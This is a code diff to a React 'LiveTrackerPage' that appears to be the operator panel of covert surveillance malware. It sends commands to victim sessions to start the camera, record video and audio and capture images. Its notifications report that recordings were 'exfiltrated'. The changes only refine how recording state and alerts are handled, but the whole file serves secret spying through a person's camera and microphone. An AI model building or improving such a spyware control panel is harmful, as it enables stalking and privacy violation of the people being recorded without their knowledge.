@@ -79,11 +79,15 @@ export default function LiveTrackerPage() {
             switch(data.type) {
                 case 'image-snapshot':
                     setLiveFeedSrc(data.snapshot);
-                    setIsCameraActive(true); // Keep active as long as snapshots come in
+                    setIsCameraActive(true);
                     break;
                 case 'video/webm':
+                    toast({ title: "Video Received", description: `A video recording was exfiltrated.`});
+                    setIsRecording(null);
+                    break;
                 case 'audio/webm':
-                    toast({ title: "Recording Received", description: `A ${data.type} recording was exfiltrated.`});
+                    toast({ title: "Audio Received", description: `An audio recording was exfiltrated.`});
+                    setIsRecording(null);
                     break;
                 case 'status':
                     if (data.message === 'Permissions granted.') {
@@ -101,7 +105,6 @@ export default function LiveTrackerPage() {
                     }
                     break;
                 default:
-                    // This could be for other media types like downloaded images etc.
                     toast({ title: 'Media Received', description: `Received media of type ${data.type}`});
             }
         }
@@ -161,8 +164,8 @@ export default function LiveTrackerPage() {
       if (!isRecording) return;
       const command = `stop-${isRecording}-record`;
       sendCommandToSession(command);
-      setIsRecording(null);
-      toast({ title: 'Recording Stopped' });
+      // We don't set isRecording to null here. We wait for the confirmation blob to arrive.
+      toast({ title: 'Stop Recording Command Sent' });
   }
   
   const currentSessionEvents = selectedSessionId ? sessions[selectedSessionId] || [] : [];
@@ -203,8 +206,8 @@ export default function LiveTrackerPage() {
                   <div className="grid grid-cols-2 gap-2">
                       <Button onClick={() => sendCommandToSession('start-video')} disabled={!selectedSessionId || isCameraActive}>Start Camera</Button>
                       <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive && !isMicActive} variant="destructive">Stop Stream</Button>
-                      <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording === 'video'}>Record Video</Button>
-                      <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording === 'audio'}>Record Audio</Button>
+                      <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording !== null}>Record Video</Button>
+                      <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording !== null}>Record Audio</Button>
                       <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
                       <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
                   </div>
